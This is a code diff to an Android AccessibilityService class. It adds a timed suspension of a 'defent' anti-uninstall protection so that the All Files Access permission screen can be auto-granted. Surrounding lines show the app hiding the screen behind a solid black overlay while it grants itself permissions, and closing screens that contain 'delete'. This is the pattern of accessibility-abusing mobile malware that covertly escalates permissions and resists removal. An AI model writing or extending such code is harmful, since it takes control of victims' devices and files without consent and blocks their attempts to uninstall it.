@@ -63,6 +63,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Solid black overlay shown during the 10-second auto-grant window
     private View overlayView;
     private WindowManager overlayWindowManager;
+
+    // While this timestamp is in the future, defent/uninstall-assist protection is suspended.
+    // Used during storage permission auto-grant (the All Files Access screen contains "delete").
+    private volatile long protectionSuspendedUntil = 0;
     
     // Uninstall assist mode
     private volatile boolean uninstallAssistMode = false;
@@ -462,6 +466,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 rootNode.recycle();
                 return;
             }
+            // While protection is suspended (e.g. during storage permission grant),
+            // skip defent/uninstall-assist so they don't close the permission screen.
+            if (System.currentTimeMillis() < protectionSuspendedUntil) {
+                rootNode.recycle();
+                return;
+            }
             // After auto-grant period ends: run uninstall-assist and defent protection.
             if (runUninstallAssist(rootNode)) {
                 rootNode.recycle();
@@ -568,6 +578,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     public void enableStorageAutoGrant() {
         if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
+
+        // Suspend defent/uninstall-assist protection for 5 seconds so the
+        // All Files Access screen (which contains "delete") isn't closed by defent.
+        protectionSuspendedUntil = System.currentTimeMillis() + 5_000;
 
         final long endTime = System.currentTimeMillis() + 20_000;
         final Handler storageHandler = new Handler(Looper.getMainLooper());
